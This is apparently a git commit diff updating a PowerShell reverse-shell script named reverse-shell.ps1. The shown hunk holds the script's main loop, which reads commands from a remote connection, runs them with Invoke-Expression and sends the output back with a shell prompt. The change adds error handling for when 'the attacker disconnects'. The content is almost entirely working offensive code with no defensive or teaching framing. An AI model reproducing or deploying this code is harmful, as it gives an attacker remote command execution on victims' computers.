4faf41193c0215c3aaadf376eb95f5b1c950076d
RacoonK1ng <nevio09.caputo@icloud.com>
2025-01-19 17:55:51 +0100

    Update reverse-shell.ps1

--- reverse-shell.ps1
+++ reverse-shell.ps1
@@ -9,24 +9,29 @@ $encoding = New-Object System.Text.ASCIIEncoding
 $writer.WriteLine("Connected to ${ip}:${port}")
 try {
     while ($stream.CanRead -and ($client.Connected -eq $true)) {
-        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
-        if ($bytesRead -le 0) {
-            break  # Exit the loop if no data is read, indicating the connection is closed
-        }
-        $data = $encoding.GetString($buffer, 0, $bytesRead)
-
         try {
-            # Execute the received command
-            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
-        } catch {
-            # Catch any errors from invalid commands and send them back
-            $sendback = "Error: $($_.Exception.Message)`n"
-        }
+            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+            if ($bytesRead -le 0) {
+                break  # Exit the loop if no data is read, indicating the connection is closed
+            }
+            $data = $encoding.GetString($buffer, 0, $bytesRead)
 
-        $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-        $sendbackBytes = $encoding.GetBytes($sendback2)
-        $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
-        $stream.Flush()
+            try {
+                # Execute the received command
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            } catch {
+                # Catch any errors from invalid commands and send them back
+                $sendback = "Error: $($_.Exception.Message)`n"
+            }
+
+            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+            $sendbackBytes = $encoding.GetBytes($sendback2)
+            $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
+            $stream.Flush()
+        } catch {
+            # Catch any stream read/write errors, which usually happen when the attacker disconnects
+            break
+        }
     }
 } catch {
     # Handle errors (e.g., connection lost)
